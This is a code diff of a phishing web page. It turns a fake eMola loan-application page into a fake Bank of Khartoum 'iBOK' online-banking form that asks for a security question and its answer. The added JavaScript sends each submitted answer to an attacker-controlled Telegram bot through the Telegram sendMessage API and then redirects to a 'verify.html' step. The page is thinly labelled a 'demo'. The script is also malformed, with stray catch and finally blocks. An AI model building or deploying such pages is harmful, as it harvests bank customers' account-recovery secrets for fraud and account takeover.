@@ -1,405 +1,457 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eMola - Candidatura de Empréstimo</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <title>Form tracking I iBOK</title>
+
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+         :root {
+            --red: #ef2e31;
+            --yellow: #ffcf00;
+            --ink: #101820;
+            --muted: #8393a3;
+            --field: #fff5f5;
+            --border: #ffb8b8;
+        }
+        
         * {
-            margin: 0;
-            padding: 0;
             box-sizing: border-box;
         }
         
-        html,
         body {
-            height: 100%;
-            font-family: 'Inter', sans-serif;
-            background: #f5f5f5;
-            overflow: hidden;
+            margin: 0;
+            min-height: 100vh;
+            color: var(--ink);
+            font-family: Arial, Helvetica, sans-serif;
+            background: #fff;
         }
         
-        body {
+        .page {
+            min-height: 100vh;
+            margin: 4px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
             display: flex;
             flex-direction: column;
-            align-items: center;
-            padding: 10px;
         }
         
         header {
-            width: 100%;
-            max-width: 480px;
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-            background: white;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            height: 143px;
+            flex: 0 0 143px;
+            background: var(--red);
+            color: white;
         }
         
-        .back-btn {
-            font-size: 28px;
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #333;
+        .welcome,
+        .brand {
+            width: min(704px, calc(100% - 40px));
+            margin-left: auto;
+            margin-right: auto;
         }
         
-        .logo {
-            height: 40px;
+        .welcome {
+            min-height: 36px;
+            margin-top: 11px;
+            border-radius: 24px;
+            background: var(--yellow);
+            color: #111;
             display: flex;
             align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 700;
+            box-shadow: 0 2px 5px #a91d1f33;
         }
         
-        .logo img {
-            height: 100%;
-            width: auto;
-            object-fit: contain;
+        .brand {
+            margin-top: 11px;
+        }
+        
+        .brand-name {
+            font-size: 32px;
+            line-height: 1.05;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .brand-caption {
+            margin-top: 6px;
+            font-size: 13px;
+        }
+        
+        main {
+            flex: 1;
+            min-height: 440px;
+            padding: 0 16px 42px;
+            background-color: #f2f5f9;
+            background-image: radial-gradient(#c8d0da 0.85px, transparent 0.85px);
+            background-size: 18px 18px;
         }
         
         .card {
-            background: white;
-            border-radius: 24px;
-            padding: 30px 25px;
-            width: 100%;
-            max-width: 480px;
-            height: calc(100vh - 100px);
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            overflow: hidden;
-            margin-bottom: 10px;
+            width: min(672px, 100%);
+            margin: 15px auto 0;
+            padding: 25px 40px 24px;
+            background: #fff;
+            border-radius: 15px;
+            box-shadow: 0 15px 28px rgba(190, 35, 40, 0.12);
         }
         
-        .top {
+        h1 {
+            margin: 0;
+            color: var(--red);
             text-align: center;
-            flex: 1;
-            overflow-y: auto;
-            padding-bottom: 20px;
+            font-size: 24px;
+            line-height: 1.25;
         }
         
-        .form-title {
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 15px;
-        }
-        
-        .progress-bar {
-            width: 160px;
-            height: 6px;
-            background: #e0e0e0;
-            border-radius: 3px;
-            margin: 20px auto;
-            overflow: hidden;
-        }
-        
-        .progress-fill {
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to right, #d1450e, #df9b09);
-        }
-        
-        .step-text {
-            color: #777;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        
-        .form-label {
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 8px;
-            font-size: 15px;
-        }
-        
-        .form-select,
-        .form-input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 12px;
-            font-size: 16px;
-            margin-bottom: 16px;
-        }
-        
-        .summary-box {
-            background: #f8f9ff;
-            padding: 16px;
-            border-radius: 16px;
-            font-size: 14px;
-        }
-        
-        .summary-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            color: #555;
-        }
-        
-        .summary-value {
-            font-weight: 600;
-            color: #333;
-        }
-        
-        .btn-group {
-            display: flex;
-            gap: 12px;
-        }
-        
-        .prev-btn,
-        .submit-btn {
-            flex: 1;
-            padding: 16px;
-            border: none;
-            border-radius: 50px;
+        .subtitle {
+            margin: 20px 0 20px;
+            text-align: center;
             font-size: 17px;
             font-weight: 700;
+        }
+        
+        .demo-note {
+            margin-bottom: 18px;
+            padding: 9px 11px;
+            border: 1px solid #f1d783;
+            border-radius: 8px;
+            background: #fff9e4;
+            color: #5f4b12;
+            font-size: 12px;
+            line-height: 1.4;
+            text-align: center;
+        }
+        
+        .field {
+            margin-bottom: 18px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 11px;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        
+        .select-wrap,
+        .input-wrap {
+            width: 100%;
+            height: 42px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background: var(--field);
+            overflow: hidden;
+        }
+        
+        select,
+        input {
+            width: 100%;
+            height: 100%;
+            padding: 0 16px;
+            border: 0;
+            outline: none;
+            background: transparent;
+            color: var(--muted);
+            font: inherit;
+            font-size: 16px;
+        }
+        
+        select {
+            color: #e23a3e;
             cursor: pointer;
         }
         
-        .prev-btn {
-            background: #eee;
-            color: #666;
+        input::placeholder {
+            color: var(--muted);
+            opacity: 1;
         }
         
-        .submit-btn {
-            background: linear-gradient(to right, #f8770e, #e08d0f);
-            color: white;
-            position: relative;
+        .submit-button {
+            width: 100%;
+            height: 42px;
+            border: 0;
+            border-radius: 10px;
+            background: var(--red);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 2px 4px #0000001c;
+        }
+        
+        .submit-button:hover {
+            background: #d92529;
+        }
+        
+        .submit-button:disabled {
+            background: #f4a3a5;
+            cursor: not-allowed;
+        }
+        
+        .message {
+            display: none;
+            margin-top: 14px;
+            padding: 10px;
+            border-radius: 8px;
+            background: #fff0f0;
+            color: #9c1b20;
+            font-size: 13px;
+            text-align: center;
+        }
+        
+        .message.visible {
+            display: block;
+        }
+        
+        .message.success {
+            background: #eafbe7;
+            color: #1d7a24;
         }
         
         footer {
-            padding: 20px;
-            color: #aaa;
-            font-size: 13px;
-            text-align: center;
-            width: 100%;
-            max-width: 480px;
-        }
-        /* Overlay de Carregamento - Azul Translúcido */
-        
-        #spinnerOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 102, 255, 0.15);
-            /* Azul translúcido */
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            flex-direction: column;
-        }
-        
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #f0f0f0;
-            border-top: 6px solid #e68b15;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 30px;
-        }
-        
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        /* Overlay de Sucesso */
-        
-        #successOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        
-        .success-card {
-            background: white;
-            border-radius: 24px;
-            padding: 40px 30px;
-            width: 90%;
-            max-width: 420px;
-            text-align: center;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
-        }
-        
-        .check-icon {
-            width: 80px;
-            height: 80px;
-            background: #00c853;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 30px;
-            font-size: 48px;
-            color: white;
-        }
-        
-        .success-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #00c853;
-            margin-bottom: 15px;
-        }
-        
-        .success-msg {
-            font-size: 16px;
-            color: #666;
+            min-height: 56px;
+            padding: 11px 10px 8px;
+            border-top: 4px solid var(--red);
+            color: #607080;
+            font-size: 11px;
             line-height: 1.6;
-            margin-bottom: 30px;
+            text-align: center;
         }
         
-        .redirect-bar {
-            background: #f0f0f0;
-            padding: 14px;
-            border-radius: 50px;
-            font-size: 15px;
-            color: #666;
-            margin-bottom: 20px;
+        .support-bubble {
+            position: fixed;
+            left: 31px;
+            bottom: 15px;
+            width: 58px;
+            height: 58px;
+            display: grid;
+            place-items: center;
+            border-radius: 50%;
+            background: #e9262b;
+            color: #fff;
+            box-shadow: 0 5px 15px #0002;
+            font-size: 25px;
+            user-select: none;
+        }
+        
+        @media (max-width: 600px) {
+            .page {
+                margin: 0;
+                border-radius: 0;
+            }
+            header {
+                height: 132px;
+                flex-basis: 132px;
+            }
+            .welcome,
+            .brand {
+                width: calc(100% - 36px);
+            }
+            main {
+                padding: 0 12px 32px;
+            }
+            .card {
+                margin-top: 15px;
+                padding: 24px 22px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            .support-bubble {
+                left: 16px;
+                bottom: 12px;
+                width: 50px;
+                height: 50px;
+            }
+        }
+        
+        .support-bubble {
+            width: 55px;
+            height: 55px;
+            background-color: #ff0000;
+            color: #ffffff;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-        }
-        
-        .redirect-bar .loader {
-            width: 20px;
-            height: 20px;
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid #e78d18;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        
-        .go-login-btn {
-            width: 100%;
-            padding: 16px;
-            background: #f76b0e;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 17px;
-            font-weight: 700;
+            font-size: 32px;
             cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+        }
+        
+        .support-bubble i {
+            color: #ffffff;
         }
     </style>
 </head>
 
 <body>
-    <header>
-        <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLjt7GJwM7u7GcGVvgKYFLd3Rbs5izlnLeBAf_tGdu8Q&s=10" alt="eMola"></div>
-        <div></div>
-    </header>
+    <div class="page">
+        <header>
+            <div class="welcome">Welcome to iBOK Online Banking service</div>
+            <div class="brand">
+                <div class="brand-name">iBOK</div>
+                <div class="brand-caption">Online Form</div>
+            </div>
+        </header>
 
-    <main class="card">
-        <div class="top">
-            <h1 class="form-title">Revisão Final</h1>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
-            <div class="step-text">Etapa 3 de 3</div>
-            <label class="form-label">Situação Profissional</label>
-            <select class="form-select" id="employmentStatus">
-                <option>Empregado</option>
-                <option>Trabalhador por Conta Própria</option>
-                <option>Desempregado</option>
-                <option>Estudante</option>
-            </select>
-            <label class="form-label">Rendimento Anual (MZN)</label>
-            <input type="number" class="form-input" id="annualIncome" placeholder="3200000">
-            <div class="summary-box" id="summaryBox">
-                <!-- Preenchido dinamicamente pelo JavaScript -->
-            </div>
+        <main>
+            <section class="card" aria-labelledby="form-title">
+                <h1 id="form-title">Follow the form</h1>
+                <p class="subtitle">Please answer the security question.</p>
+
+                <form id="demo-form">
+                    <div class="field">
+                        <label for="question">----Choose a security question---</label>
+                        <div class="select-wrap">
+
+                            <select id="question" name="question">
+    <option value="">-- Select Security Question --</option>
+    <option value="cousin_name">What is your first cousin's name?</option>
+    <option value="birth_city">What city were you born in?</option>
+    <option value="graduation_year">What year did you graduate from university?</option>
+    <option value="childhood_nickname">What was your nickname during your childhood?</option>
+    <option value="favorite_author">The name of your favorite author?</option>
+    <option value="favorite_car">The name of your favorite car manufacturer?</option>
+    <option value="favorite_movie">Which movie is your favorite?</option>
+    <option value="childhood_friend">Childhood best friend's name?</option>
+    <option value="license_year">What year did you get your driver's license?</option>
+    <option value="first_tv_brand">Brand your first TV?</option>
+    <option value="marriage_year">What year did you get married?</option>
+    <option value="favorite_football_team">The name of your favorite football team?</option>
+    <option value="school_name">What is the name of the school you attended?</option>
+    <option value="first_foreign_country">The name of the first foreign country you visited?</option>
+    <option value="first_car_brand">What was your first car brand?</option>
+</select>
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label for="answer">Enter the answer</label>
+                        <div class="input-wrap">
+                            <input id="answer" name="answer" type="text" placeholder="Write your answer here" autocomplete="off" />
+                        </div>
+                    </div>
+
+                    <button class="submit-button" type="submit" id="submit-button">Send</button>
+                    <div class="message" id="message" role="status" aria-live="polite"></div>
+                </form>
+            </section>
+        </main>
+
+        <footer>
+            iBOK I Bank of Khartoum 2026<br /> All rights reserved. Bank of Khartoum ,iBOK 2026.
+        </footer>
+
+        <div class="support-bubble" aria-label="WhatsApp support" title="WhatsApp support">
+            <i class="fa-brands fa-whatsapp"></i>
         </div>
-        <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">ANTERIOR</button>
-            <button class="submit-btn" id="submitBtn">SUBMETER CANDIDATURA</button>
-        </div>
-    </main>
-    <footer>© 2025 eMola</footer>
-    <!-- Overlay de Carregamento (Azul Translúcido) -->
-    <div id="spinnerOverlay">
-        <div class="spinner"></div>
     </div>
-    <!-- Overlay de Sucesso -->
-    <div id="successOverlay">
-        <div class="success-card">
-            <div class="check-icon">✓</div>
-            <div class="success-title">Candidatura de Empréstimo Submetida</div>
-            <div class="success-msg">
-                A sua candidatura de empréstimo foi submetida. Aguarde a aprovação.<br><br> Irá receber uma mensagem de confirmação. Por agora, prossiga para o eMola.
-            </div>
-            <div class="redirect-bar">
-                <div class="loader"></div>
-                Redirecionando para o login do eMola em <span id="countdown">3</span>...
-            </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">Ir para o Login Agora</button>
-        </div>
-    </div>
+
     <script>
-        const summaryBox = document.getElementById('summaryBox');
-        summaryBox.innerHTML = `
-            <div class="summary-row"><span>Tipo de Empréstimo:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Empréstimo Pessoal'}</span></div>
-            <div class="summary-row"><span>Montante:</span><span class="summary-value">${parseFloat(localStorage.getItem('loanAmount') || 320000).toLocaleString('pt-MZ')} MZN</span></div>
-            <div class="summary-row"><span>Prazo:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Meses</span></div>
-            <div class="summary-row"><span>Finalidade:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Não especificado'}</span></div>
-            <div class="summary-row"><span>Nome:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
-            <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/D'}</span></div>
-            <div class="summary-row"><span>Telemóvel:</span><span class="summary-value">+258 ${localStorage.getItem('phone') || 'N/D'}</span></div>
-        `;
-        if (localStorage.getItem('employmentStatus')) {
-            document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
-        }
-        if (localStorage.getItem('annualIncome')) {
-            document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
-        }
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            const income = document.getElementById('annualIncome').value.trim();
-            if (!income || income < 50000) {
-                alert('Por favor, introduza um rendimento anual válido (mínimo 50.000 MZN).');
+        // ===== TELEGRAM CONFIG =====
+        const BOT_TOKEN = "YOUR_BOT_TOKEN"; // from @BotFather, e.g. "123456789:AAH..."
+        const CHAT_ID = "YOUR_CHAT_ID"; // your chat/user ID, e.g. "123456789"
+        // ===========================
+
+        const form = document.getElementById("demo-form");
+        const message = document.getElementById("message");
+        const question = document.getElementById("question");
+        const answer = document.getElementById("answer");
+        const submitButton = document.getElementById("submit-button");
+
+        form.addEventListener("submit", async(event) => {
+            event.preventDefault();
+
+            const questionText = question.options[question.selectedIndex].text;
+            const answerText = answer.value.trim();
+
+            // Validation
+            if (!question.value) {
+                message.textContent = "Please select a demo topic.";
+                message.classList.add("visible");
+                message.classList.remove("success");
                 return;
             }
-            localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
-            localStorage.setItem('annualIncome', income);
-            // Mostrar overlay azul translúcido durante 3 segundos
-            const spinnerOverlay = document.getElementById('spinnerOverlay');
-            spinnerOverlay.style.display = 'flex';
-            setTimeout(() => {
-                spinnerOverlay.style.display = 'none';
-                const successOverlay = document.getElementById('successOverlay');
-                successOverlay.style.display = 'flex';
-                // Contagem decrescente de 3 segundos e redirecionamento automático
-                let seconds = 3;
-                const countdownEl = document.getElementById('countdown');
-                const timer = setInterval(() => {
-                    seconds--;
-                    countdownEl.textContent = seconds;
-                    if (seconds <= 0) {
-                        clearInterval(timer);
-                        window.location.href = 'login.html';
-                    }
-                }, 1000);
-            }, 3000);
+
+            if (!answerText) {
+                message.textContent = "Please enter a response.";
+                message.classList.add("visible");
+                message.classList.remove("success");
+                return;
+            }
+
+            // Build the Telegram message
+            const text =
+                "📩 <b>New Demo Submission</b>\n\n" +
+                "❓ <b>Topic:</b> " + questionText + "\n" +
+                "💬 <b>Response:</b> " + answerText;
+
+            // Disable button while sending
+            submitButton.disabled = true;
+            submitButton.textContent = "SENDING...";
+            message.classList.remove("visible", "success");
+
+            try {
+                const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+                const res = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: "HTML"
+                    })
+                });
+
+                const data = await res.json();
+
+                if (data.ok) {
+                    message.textContent = "Submitted successfully. Thank you!";
+                    message.classList.add("visible", "success");
+                    form.reset();
+                } else {
+                    message.textContent = "Telegram error: " + data.description;
+                    message.classList.add("visible");
+                }
+            } catch (err) {
+                message.textContent = "Failed to send. Please check your connection.";
+                message.classList.add("visible");
+            } finally {
+                submitButton.disabled = false;
+                submitButton.textContent = "CONTINUE DEMO";
+            }
         });
+
+        // Navigate to summary.html after successful submission
+        window.location.href = "verify.html";
+
+        }
+        catch (error) {
+            console.error("Telegram notification error:", error);
+
+            showMessage(
+                "Telegram notification failed. Check your bot configuration and try again.",
+                false
+            );
+
+
+        } finally {
+            requestInProgress = false;
+            submitButton.disabled = false;
+            submitButton.textContent = "CONTINUE DEMO";
+        }
+        });
+
+        // Closes DOMContentLoaded
     </script>
 </body>
 
